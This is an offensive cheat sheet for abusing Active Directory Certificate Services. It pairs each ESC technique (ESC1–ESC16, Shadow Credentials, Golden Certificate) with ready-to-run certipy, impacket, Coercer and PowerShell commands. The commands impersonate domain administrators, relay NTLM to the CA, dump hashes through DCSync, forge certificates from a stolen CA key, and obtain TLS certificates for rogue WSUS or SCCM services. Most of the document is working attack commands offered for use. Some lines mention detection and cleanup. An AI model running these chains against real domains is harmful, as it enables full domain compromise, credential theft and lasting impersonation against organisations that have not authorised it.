# ADCS Certificate Abuse — ESC Technique Map and Attack Chains

---

## Contents

- [Enumeration](#enumeration)
- [Dangling CA template references](#dangling-ca-template-references)
- [ESC1 — Enrollee-Supplied SAN](#esc1--enrollee-supplied-san)
- [ESC2 — Any Purpose / SubCA Template](#esc2--any-purpose--subca-template)
- [ESC3 — Certificate Request Agent](#esc3--certificate-request-agent)
- [ESC4 — Writable Template ACL](#esc4--writable-template-acl)
- [ESC6 — CA SAN flag](#esc6--editf_attributesubjectaltname2-on-ca)
- [ESC7 — CA Manager / Officer Rights](#esc7--ca-manager--officer-rights)
- [ESC8 — NTLM Relay](#esc8--ntlm-relay-to-adcs-web-enrollment)
- [Shadow Credentials](#shadow-credentials)
- [Certificate authentication](#certificate-authentication--credential-extraction)
- [ESC9 — No Security Extension](#esc9--no-security-extension-ct_flag_no_security_extension)
- [ESC10 — Weak Certificate Mapping](#esc10--weak-certificate-mapping-certificatemappingmethods)
- [ESC11 — NTLM Relay to ICPR](#esc11--ntlm-relay-to-icpr-rpc-certificate-enrollment)
- [ESC12 — YubiHSM Key Material](#esc12--yubihsm-key-material)
- [ESC13 — Issuance Policy Group Link](#esc13--issuance-policy-oid-group-link)
- [ESC14 — Explicit Certificate Mapping](#esc14--explicit-certificate-mapping-altsecurityidentities)
- [ESC15 — Application Policy Injection](#esc15--ekuwu--application-policy-injection-cve-2024-49019)
- [ESC16 — SID Extension Disabled](#esc16--sid-security-extension-globally-disabled)
- [ESC5 — Golden Certificate](#golden-certificate-esc5--ca-key-compromise)
- [TLS Service Impersonation](#adcs-for-tls-service-impersonation-non-pkinit)

## Enumeration

```bash
# certipy (Linux)
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -stdout
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -json -output adcs_output

# Certify (Windows)
.\Certify.exe find /vulnerable
.\Certify.exe cas              # enumerate CAs
.\Certify.exe templates        # all templates
```

Output shows: CA name, template name, ESC class, enrollment rights, vulnerable flags.

### Dangling CA template references

A CA can publish a name in its `certificateTemplates` attribute even when no matching
`pKICertificateTemplate` object exists. Compare the values on the Enrollment Services
object with template `cn` values under the Certificate Templates container in the
Configuration naming context; do not treat a missing object as exploitable by itself.

```text
CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,...
CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,...
```

For each orphaned name, inspect the template container DACL for `CreateChild`,
`WriteDacl`, `WriteOwner`, or broader control. Resolve the ACE SID manually and expand
nested group membership when LDAP visibility or SID lookup is restricted: a failed
`certipy find -vulnerable` SID resolution is inconclusive, not proof of safety. Creating a
functional template may also require authority to create the associated
`msPKI-Enterprise-Oid` object (or an equivalent valid OID path). In the dangling case the
stale name is already published, so no CA publication right is implied; changing the CA's
`certificateTemplates` list instead requires **Manage CA** or equivalent CA administration.
**Issue and Manage Certificates** governs certificate-manager/officer actions, not template
publication. Confirm that the created template grants the requester enrollment and that no
issuance requirement blocks the request. Treat this as an AD CS misconfiguration chain,
not a security-boundary bypass. Preserve the original CA/template ACL evidence, clone only
schema-required attributes from a known template, validate the resulting ESC class, and
remove the test object after the authorized proof.

---

## ESC1 — Enrollee-Supplied SAN

Template allows enrollee to specify Subject Alternative Name → request cert as DA.

**Requirements**: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` on template + enrollment permission.

```bash
# Request cert with DA UPN in SAN
certipy req -u user@domain.local -p pass -ca '<CA-Name>' -template '<template>' \
  -upn administrator@domain.local -dc-ip <dc_ip>

# Certify (Windows) + Rubeus
.\Certify.exe request /ca:<CA-Name> /template:<template> /altname:administrator
# Convert .pem to .pfx: openssl pkcs12 -in cert.pem -keyex -CSP "RSA" -export -out cert.pfx

# Authenticate with cert → get TGT
certipy auth -pfx administrator.pfx -domain domain.local -username administrator -dc-ip <dc_ip>
# Outputs: NTLM hash + TGT (.ccache)

# Use NTLM hash for pass-the-hash
impacket-secretsdump domain.local/administrator@<dc_ip> -hashes :NTLM
```

---

## ESC2 — Any Purpose / SubCA Template

Template has `Any Purpose` EKU or no EKU → can be used for anything including client auth.

```bash
# Same flow as ESC1 — request with -upn flag
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<esc2-template>' \
  -upn administrator@domain.local
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

---

## ESC3 — Certificate Request Agent

Enroll in template with `Certificate Request Agent` EKU → use that cert to enroll on behalf of any user in another template.

```bash
# Step 1: Get agent certificate
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<ESC3-Agent-Template>'

# Step 2: Enroll on behalf of DA using agent cert
certipy req -u user@domain.local -p pass -ca '<CA>' -template 'User' \
  -on-behalf-of domain\\administrator -pfx agent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

---

## ESC4 — Writable Template ACL

Current user has `WriteProperty`/`WriteDacl`/`GenericAll` on template → modify it to allow ESC1.

```bash
# Modify template to add ENROLLEE_SUPPLIES_SUBJECT flag
certipy template -u user@domain.local -p pass -template '<template>' -save-old
certipy template -u user@domain.local -p pass -template '<template>' \
  -configuration '<CA>\<template>' -target <dc_ip>

# Now request as ESC1
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<template>' \
  -upn administrator@domain.local

# Restore original template
certipy template -u user@domain.local -p pass -template '<template>' -configuration old_template.json
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA

CA has this flag set → ANY template with client auth EKU allows enrollee-supplied SAN, even without the template flag.

```bash
# Check flag
certipy find ... | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"

# Exploit: same as ESC1 — use any client auth template you can enroll in (User/Machine)
certipy req -u user@domain.local -p pass -ca '<CA>' -template 'User' \
  -upn administrator@domain.local
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

**Post-May-2022 SID extension (the ESC6-alone trap).** Patched CAs embed the *requester's* SID in
`szOID_NTDS_CA_SECURITY_EXT`, and a Full-Enforcement KDC binds on it — so a SAN-spoofed cert still
authenticates as *you*, and `certipy auth` aborts with `Object SID mismatch between certificate and
user`. Two fixes:

- **Embed the victim SID** (ESC6 lets you supply arbitrary SAN incl. the SID URL):
  ```bash
  certipy req ... -upn administrator@domain.local -sid S-1-5-21-<dom>-500
  ```
  Cert now carries UPN + Administrator's SID → passes both certipy's check and the KDC.
- **Chain with ESC16** (below) to disable the SID extension globally, then no `-sid` needed.

If `certipy auth` still refuses on SID, extract PEM and use impacket's PKINIT support:
```bash
certipy cert -pfx administrator.pfx -nokey -out adm.crt; certipy cert -pfx administrator.pfx -nocert -out adm.key
impacket-getTGT -cert-pem adm.crt -key-pem adm.key -dc-ip <dc> domain.local/administrator
```

---

## ESC7 — CA Manager / Officer Rights

`ManageCA` (CA Administrator) or `ManageCertificates` (Officer) on the CA. Two exploitation routes;
pick by which right you hold. A gMSA/service account is a common holder — read its password first
(`nxc ldap --gmsa`, needs the `PrincipalsAllowedToReadPassword` principal), then PtH.

**Route A — ManageCA → reconfigure CA to ESC6 (cleanest, no officer/approval).**
Enabling EDITF needs writing the policy-module registry. `certutil -setreg` **requires local admin**
(fails `requires elevation`) even for a CA admin — so use the **COM API `ICertAdmin2::SetConfigEntry`**,
which only checks ManageCA. ManageCA can also stop/start CertSvc (`sc.exe`), which `Restart-Service`
may not. Run from any shell as the ManageCA principal (e.g. WinRM as the gMSA):
```powershell
$CA=New-Object -ComObject CertificateAuthority.Admin; $C="DC01.domain.local\<CA>"
$CA.SetConfigEntry($C,"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy","EditFlags",(<cur> -bor 0x40000)) # ESC6
sc.exe stop certsvc; sc.exe start certsvc
```
Then enroll as a *Domain User* account (the gMSA is usually in Domain Computers, not Users → can't
enroll `User`) with `-upn administrator -sid <admin-sid>` (see ESC6).

**Route B — ManageCA → add Officer → approve SubCA request.**
```bash
certipy ca -ca '<CA>' -u mgr@dom -hashes :<h> -add-officer <you>        # grant ManageCertificates
certipy ca -ca '<CA>' -u mgr@dom -hashes :<h> -enable-template SubCA
echo y | certipy req -u <you>@dom -p pass -ca '<CA>' -template SubCA -upn administrator@dom -sid <admin-sid>  # denied, saves <id>.key
certipy ca -ca '<CA>' -u <officer>@dom -p pass -issue-request <id>       # approve as officer
echo y | certipy req -u <you>@dom -p pass -ca '<CA>' -retrieve <id>
```
Gotchas that cause `Insufficient permissions to issue certificate`:
- **Officer rights need a CertSvc restart** to load — after `-add-officer`, restart the CA.
- The issuing principal needs **both** ManageCertificates (officer) **and** `Certificate Service DCOM
  Access` (contains Authenticated Users by default). An explicit `Deny Certificate Manager` ACE on the
  gMSA overrides its Allow — approve as the *added officer*, not the gMSA.
- Verify state on the CA: `certutil -getreg CA\Security` (officer ACEs), `certutil -getreg CA\OfficerRights`.

---

## ESC8 — NTLM Relay to ADCS Web Enrollment

Relay NTLM auth to ADCS HTTP endpoint → obtain certificate for any relaying principal.

```bash
# Setup relay (see ntlm-relay.md)
impacket-ntlmrelayx -t http://<ADCS-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication
python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <attacker_ip>

# ntlmrelayx outputs DC certificate → save dc.pfx

# Authenticate with DC cert
certipy auth -pfx dc.pfx -domain domain.local -username '<dc_hostname>$' -dc-ip <dc_ip>

# DCSync using TGT
impacket-secretsdump -k -no-pass domain.local/'<dc_hostname>$'@<dc_ip>
```

---

## Shadow Credentials

Write `msDS-KeyCredentialLink` attribute to target → authenticate as target via PKINIT (no cert template needed, no CA needed).

**Requirements**: `GenericWrite`/`GenericAll` on target account.

```bash
# certipy shadow
certipy shadow auto -u user@domain.local -p pass -account <target_user> -dc-ip <dc_ip>
# Outputs: NTLM hash of target_user

# Manual:
certipy shadow add -u user@domain.local -p pass -account <target_user> -dc-ip <dc_ip>
# → produces <target_user>.pfx
certipy auth -pfx <target_user>.pfx -domain domain.local -username <target_user> -dc-ip <dc_ip>
```

---

## Certificate authentication → credential extraction

```bash
# certipy auth → always produces both TGT and NTLM hash
certipy auth -pfx user.pfx -domain domain.local -username user -dc-ip <dc_ip>
# Output: user.ccache + NTLM hash printed

# Use TGT
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@<target>

# Use NTLM hash
impacket-secretsdump domain.local/user@<dc_ip> -hashes :NTLM
crackmapexec smb <subnet>/24 -u user -H NTLM --local-auth
```

---

## ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

Template has `msPKI-Enrollment-Flag` containing `CT_FLAG_NO_SECURITY_EXTENSION` (0x80000). Combined with weak certificate mapping (`StrongCertificateBindingEnforcement=0` or `CertificateMappingMethods=0x04`), allows impersonation via UPN manipulation.

**Requirements**: `GenericWrite` on target user + vulnerable mapping configuration on DC.

```bash
# 1. Write shadow credentials to get target's current state (optional backup)
# 2. Change target user's UPN to the impersonation target (e.g., administrator)
certipy shadow auto -u attacker@domain.local -p pass -account <victim_user> -dc-ip <dc_ip>

# 3. Request cert from vulnerable template (with NO_SECURITY_EXTENSION)
certipy req -u <victim_user>@domain.local -hashes :<victim_hash> -ca '<CA>' \
  -template '<ESC9-Template>' -dc-ip <dc_ip>

# 4. Change victim's UPN back to original
# 5. Authenticate with certificate — maps to administrator due to weak binding
certipy auth -pfx <victim_user>.pfx -domain domain.local -username administrator -dc-ip <dc_ip>
```

**Detection**: Monitor for UPN changes (Event ID 4738) followed by certificate enrollment.

---

## ESC10 — Weak Certificate Mapping (CertificateMappingMethods)

Two sub-cases depending on registry configuration:

### Case 1: StrongCertificateBindingEnforcement = 0

```bash
# Same flow as ESC9 — change target UPN, request cert, change back, authenticate
certipy account update -u attacker@domain.local -p pass -user <victim> -upn administrator@domain.local
certipy req -u <victim>@domain.local -p <victim_pass> -ca '<CA>' -template '<template>'
certipy account update -u attacker@domain.local -p pass -user <victim> -upn <victim>@domain.local
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

### Case 2: CertificateMappingMethods includes UPN mapping (0x04)

Same approach — exploits the fact that SChannel authentication maps certificates to users based on UPN without verifying the SID in the certificate.

---

## ESC11 — NTLM Relay to ICPR (RPC Certificate Enrollment)

Similar to ESC8 but targets the RPC-based enrollment interface (MS-ICPR) instead of HTTP. Exploitable when the CA does not enforce `IF_ENFORCEENCRYPTICERTREQUEST` flag.

```bash
# Check if CA RPC interface lacks encryption enforcement
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable | grep -i "IF_ENFORCEENCRYPTICERTREQUEST"

# Setup relay to RPC endpoint
certipy relay -ca <ca_ip> -template DomainController

# Coerce authentication (PetitPotam/Coercer targeting DC)
python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <attacker_ip>

# Result: certificate issued for DC machine account → DCSync
certipy auth -pfx <dc_hostname>.pfx -domain domain.local -dc-ip <dc_ip>
impacket-secretsdump -k -no-pass domain.local/<dc_hostname>$@<dc_fqdn>
```

---

## ESC12 — YubiHSM Key Material

When an enterprise CA protects its signing key with a YubiHSM2, readable deployment material on the
CA host can still collapse the boundary through the YubiHSM KSP/middleware. First confirm that the CA
uses that KSP. Then inspect the host for connector configuration, `AuthKeysetID`, and the cleartext
`AuthKeysetPassword` needed to open an HSM session. Connector settings alone are not evidence of
compromise.

If the complete authentication material is recoverable, validate access with vendor tooling and use
only the intended CA signing key. The weakness permits unauthorized use of the non-exportable key to
sign certificates; it does not imply that the private key was extracted. The result has the same
durable impact as ESC5 because certificates can be forged independently of enrollment policy.
Preserve key identifiers and avoid destructive HSM operations; rotation and revocation are
remediation, not validation steps.

---

## ESC13 — Issuance Policy OID Group Link

Certificate template has an issuance policy OID that maps to a universal group. Enrolling in the template grants effective membership in that group via the certificate's policy extension.

**Requirements**: Enrollment rights on the vulnerable template + template has issuance policy linked to a privileged group.

```bash
# Identify ESC13 — certipy find shows linked group
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -stdout | grep -A5 "ESC13"

# Enumerate the linked group (check what privileges it grants)
# The OID's msDS-OIDToGroupLink attribute points to a group DN

# Exploit: request certificate from vulnerable template
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<ESC13-Template>' -dc-ip <dc_ip>

# Authenticate — certificate grants group membership through issuance policy
certipy auth -pfx user.pfx -domain domain.local -username user -dc-ip <dc_ip>
```

---

## ESC15 — EKUwu / Application Policy Injection (CVE-2024-49019)

Schema Version 1 templates with `ENROLLEE_SUPPLIES_SUBJECT` allow the enrollee to smuggle application policies into the CSR. The CA copies them into the issued cert, and Windows PKI prefers Application Policies over the template's EKU list — so a template with only `Server Authentication` (or any non-client-auth) EKU can yield a `Client Authentication` cert usable for PKINIT.

**Requirements**: enrollment on a schema v1 template with `ENROLLEE_SUPPLIES_SUBJECT`. Patched by Microsoft on 2024-11-12; unpatched DCs remain vulnerable.

```bash
# Identify (certipy tags ESC15 explicitly)
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -stdout | grep -A5 ESC15

# Request with injected Client Authentication application policy
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<v1-template>' \
  -upn administrator@domain.local -application-policies 'Client Authentication' -dc-ip <dc_ip>

# Authenticate (PKINIT) → NTLM hash
certipy auth -pfx administrator.pfx -domain domain.local -username administrator -dc-ip <dc_ip>
```

Other useful `-application-policies` values: `Certificate Request Agent` (chain into ESC3), `Code Signing`.

---

## ESC14 — Explicit Certificate Mapping (altSecurityIdentities)

Abuses explicit certificate mapping configured via `altSecurityIdentities` attribute. If you can write to this attribute on a target, you can map your own certificate to authenticate as that target.

```bash
# Requires GenericWrite/GenericAll on target user/computer
# Write your certificate's mapping to target's altSecurityIdentities
certipy account update -u attacker@domain.local -p pass -user <target> \
  -altname "X509:<I>DC=local,DC=domain,CN=CA<S>CN=attacker"

# Authenticate with your existing certificate — now maps to target
certipy auth -pfx attacker.pfx -domain domain.local -username <target> -dc-ip <dc_ip>
```

---

## ESC16 — SID Security Extension Globally Disabled

The CA has `szOID_NTDS_CA_SECURITY_EXT` (`1.3.6.1.4.1.311.25.2`) in its policy `DisableExtensionList`
→ **no** cert it issues carries the requester SID. Every issued cert then authenticates purely by
UPN/SAN, defeating the May-2022 hardening for the whole CA. Pairs with ESC6 (or any SAN control) to
impersonate anyone without needing `-sid`.

```powershell
# Set (needs ManageCA; COM API, no local admin) then restart CertSvc
$CA=New-Object -ComObject CertificateAuthority.Admin
$CA.SetConfigEntry("DC01.domain.local\<CA>","PolicyModules\CertificateAuthority_MicrosoftDefault.Policy","DisableExtensionList","1.3.6.1.4.1.311.25.2")
sc.exe stop certsvc; sc.exe start certsvc
```
```bash
# Detect: certipy flags ESC16, or read the reg value
certutil -config "DC01\<CA>" -getreg policy\DisableExtensionList
# Exploit (ESC6+ESC16): request as any enrollable user with victim UPN, no SID needed
echo y | certipy req -u svc@dom -p pass -ca '<CA>' -template User -upn administrator@dom -dc-ip <dc>
certipy auth -pfx administrator.pfx -dc-ip <dc>   # cert has no SID → KDC maps by UPN → Administrator
```

## Golden Certificate (ESC5 — CA Key Compromise)

If the CA private key is compromised (admin access to CA server), forge any certificate indefinitely.

```bash
# Backup CA cert + private key (requires admin on CA)
certipy ca -backup -u admin@domain.local -p pass -ca '<CA-Name>' -target <ca_host>
# Outputs: ca.pfx

# Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local -subject 'CN=Administrator,CN=Users,DC=domain,DC=local'
# Outputs: administrator_forged.pfx

# Authenticate
certipy auth -pfx administrator_forged.pfx -domain domain.local -username administrator -dc-ip <dc_ip>
```

**Persistence value**: survives krbtgt reset, user password changes. Only invalidated by CA re-key (extremely rare).

---

## ADCS for TLS Service Impersonation (non-PKINIT)

When a template has **EnrolleeSuppliesSubject + Server Authentication EKU** but **no Client Authentication EKU**, the issued cert cannot be used for PKINIT, Schannel LDAP auth, or PassTheCert. However, it is the exact material needed to impersonate any HTTPS service that clients validate against the enterprise CA trust chain.

### Target services

| Service | Typical hostname | Impact of impersonation |
|---------|-----------------|------------------------|
| WSUS | wsus.domain.local | Push arbitrary executables as SYSTEM updates |
| SCCM/MECM | sccm.domain.local | Deploy packages, run scripts as SYSTEM |
| ADFS | adfs.domain.local | Intercept SAML tokens, credential harvest |
| Internal web apps | app.domain.local | MitM authenticated sessions |

### Identification

```bash
# Find templates with ENROLLEE_SUPPLIES_SUBJECT + Server Auth EKU (not Client Auth)
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -stdout -enabled | \
  grep -A20 "ENROLLEE_SUPPLIES_SUBJECT" | grep -B5 "Server Authentication"
```

Key indicators:
- `Enrollee Supplies Subject: True`
- `Extended Key Usage: Server Authentication` (OID 1.3.6.1.5.5.7.3.1)
- **No** `Client Authentication` (OID 1.3.6.1.5.5.7.3.2)
- Enrollment rights: check which groups can enroll

### CSR generation (attacker keeps private key)

```python
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
open('svc_key.pem', 'wb').write(pk.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.TraditionalOpenSSL,
    serialization.NoEncryption()))

csr = (x509.CertificateSigningRequestBuilder()
       .subject_name(x509.Name([
           x509.NameAttribute(NameOID.COMMON_NAME, '<target_hostname>')]))
       .add_extension(x509.SubjectAlternativeName([
           x509.DNSName('<target_hostname>'),
           x509.DNSName('<short_name>')]), critical=False)
       .sign(pk, hashes.SHA256()))
open('svc.csr', 'wb').write(csr.public_bytes(serialization.Encoding.DER))
```

### Submission via certreq (from Windows, as enrolled user)

```cmd
REM Submit CSR to CA with template specified in attributes (not INF)
certreq -f -submit -config "DC01.domain.local\CA-Name" ^
  -attrib "CertificateTemplate:<TemplateName>" ^
  C:\path\svc.csr C:\path\svc.cer < NUL

REM -f: overwrite without prompt
REM < NUL: prevent interactive prompts from blocking in automated contexts
```

### Alternative: DLL/script execution as enrolled user

When the enrolled user is accessed indirectly (e.g., via scheduled task DLL hijack), embed the certreq call in the payload. Critical flags:
- **`-f`**: prevents overwrite confirmation prompt
- **`< NUL`**: prevents stdin blocking in non-interactive contexts
- Both are mandatory when running inside a task/service that loops

### Build PFX and PEM for server use

```bash
# Combine CA-issued cert with attacker's private key
openssl pkcs12 -export -out svc.pfx -inkey svc_key.pem -in svc.cer -passout pass:
openssl pkcs12 -in svc.pfx -out svc_cert.pem -clcerts -nokeys -passin pass:
openssl pkcs12 -in svc.pfx -out svc_key_out.pem -nocerts -nodes -passin pass:

# Verify key matches cert
openssl x509 -in svc_cert.pem -noout -modulus | md5sum
openssl rsa -in svc_key.pem -noout -modulus | md5sum
# Must match

# Verify SAN
openssl x509 -in svc_cert.pem -noout -ext subjectAltName
```

### Next steps after cert acquisition

With a valid TLS cert for a service hostname:
1. Poison DNS (ADIDNS injection) → hostname resolves to attacker
2. Stand up rogue service with the cert (HTTPS on expected port)
3. Trigger client connection (WSUS scan, SCCM policy refresh, etc.)

→ Full WSUS attack chain: see [ad-services-abuse.md §Rogue WSUS](ad-services-abuse.md)

### Key distinction from ESC1

| | ESC1 (identity theft) | TLS impersonation |
|---|---|---|
| EKU needed | Client Authentication | Server Authentication |
| SAN content | UPN of target user | DNS name of target service |
| Result | Authenticate AS the target | Impersonate a service TO clients |
| Direct domain compromise | Yes (PKINIT → hash) | Indirect (SYSTEM exec via service abuse) |
